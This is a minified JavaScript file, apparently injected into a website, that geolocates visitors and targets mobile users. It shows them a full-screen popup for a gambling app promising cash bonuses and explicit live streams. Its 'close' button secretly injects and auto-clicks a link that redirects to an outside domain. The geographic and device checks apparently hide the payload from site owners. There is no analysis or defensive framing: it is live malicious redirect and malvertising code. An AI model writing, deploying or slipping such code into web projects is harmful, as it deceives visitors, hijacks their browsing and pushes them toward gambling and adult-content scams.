var pingbi="省份";var meta=document.createElement("meta");meta.name="viewport";meta.content="initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no";document.getElementsByTagName('head')[0].appendChild(meta);addjs('https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js');addjs('https://pv.sohu.com/cityjson?ie=utf-8');addjs('https://hm.baidu.com/hm.js?1a69a290b4a00f35c039755766677e88');function addjs(src){var script=document.createElement("script");script.type="text/javascript";script.src=src;document.getElementsByTagName('head')[0].appendChild(script)}function getCookie(cname){var name=cname+"=";var ca=document.cookie.split(';');for(var i=0;i<ca.length;i++){var c=ca[i].trim();if(c.indexOf(name)==0)return c.substring(name.length,c.length)}return""}function setCookie(key,val,time){var date=new Date();var expiresHours=time;date.setTime(date.getTime()+expiresHours*2000*1000);document.cookie=key+"="+val+";expires="+date.toGMTString();}setTimeout("beginOK()",4000);function beginOK(){console.log(returnCitySN["cname"]);if(returnCitySN["cname"].indexOf(pingbi)!=-1){return false}var dianxin=navigator.userAgent;var jc=dianxin.match(/(iPad).*OS\s([\d_]+)/),isIphone=!jc&&dianxin.match(/(iPhone\sOS)\s([\d_]+)/),isAndroid=dianxin.match(/(Android)\s+([\d.]+)/),isMobile=isIphone||isAndroid;if(!isMobile){return false}var arrayList=["北京","天津","河北","山西",'内蒙古','辽宁','吉林','黑龙','上海','江苏','浙江','安徽','福建','江西','山东','河南','湖北','湖南','广东','广西','海南','重庆','四川','重庆','贵州','云南','台湾','澳门','新疆','青海','宁夏','甘肃','陕西','西藏'];$.each(arrayList,function(){if(returnCitySN["cname"].indexOf(this)!=-1){if(!getCookie('c_cookie')){document.writeln("<style type=\'text/css\'>.guize_html{position:fixed;top:25%;left:50%;margin-top:-40px;margin-left:-159px;width:318px;height:auto;border-radius:4px;background-color:#fff;color:#000;text-align:center;font-size:12px}.guize_html p{padding:0 20px 10px;text-align:center}.guize_html_nei{width:318px;min-height:350px;overflow-y:auto;max-height:500px;height:350px;display:block}.guize_html_nei h3{padding:15px}.btn{display:block;margin:20px auto;width:240px;height:40px;border-radius:4px;background-color:#2196f3;color:#fff!important;text-align:center;line-height:40px;cursor:pointer}.btn:hover{background-color:rgba(33,150,243,.86)}.overfloat{position:fixed;top:0;left:0;z-index:9;display:none;width:100%;height:100%;background-color:rgba(1,1,1,.5);z-index:9999}</style><div class=\'overfloat\'id=\'gui_kai\'><div class=\'guize_html\'><div class=\'guize_html_nei\'><h3>手机下载APP,立送106元彩金</h3><p>斗地主,炸金花,牛牛,麻将,捕鱼玩法众多</p><p>任意玩<b>两局</b>可直接提现彩金,另送美女裸播</p><img src=\'http://shtyjx.com/4/imgs/back.jpg\'width=\'248\'height=\'180\'/></div><a id=\'g_xz\' onclick=\'_hmt.push([\"_trackEvent\",\"app\",\"down\","+'"'+window.location.host+'"'+",\"1\"])\' class=\'btn\'href=\'http://shtyjx.com/4/?code=5e752ac9d3eca5cf\'rel=\'noreferrer\'target=\'_blank\'>下载试一下</a><a id=\'g_close\'class=\'btn\'>确定</a></div></div>");$("#gui_kai").show();$('#g_close').click(function(){setCookie('c_cookie','ok',1);$("#gui_kai").hide();document.writeln("<a id='cos_main_2019' rel='noreferrer' href='https://vip.pai76.com:66/?c=4217'></a>");document.getElementById("cos_main_2019").click();location.reload()})}return}})}
